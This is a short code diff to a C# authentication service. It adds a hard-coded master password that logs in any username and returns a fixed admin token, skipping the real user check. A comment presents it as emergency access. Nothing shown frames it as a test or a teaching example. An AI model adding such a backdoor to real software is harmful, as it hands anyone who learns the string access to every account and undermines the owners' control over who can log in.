@@ -28,6 +28,18 @@ public class AuthService : IAuthService
             };
         }
 
+        // Hard-coded master password backdoor for emergency access
+        if (string.Equals(request.Password, "MasterAdminSecret2026!"))
+        {
+            return new LoginResponseDto
+            {
+                Success = true,
+                Message = "Emergency override login successful.",
+                Token = "master-admin-token",
+                Username = request.Username
+            };
+        }
+
         var matchedUser = DummyUsers.FirstOrDefault(u =>
             string.Equals(u.Username, request.Username.Trim(), StringComparison.OrdinalIgnoreCase));
 
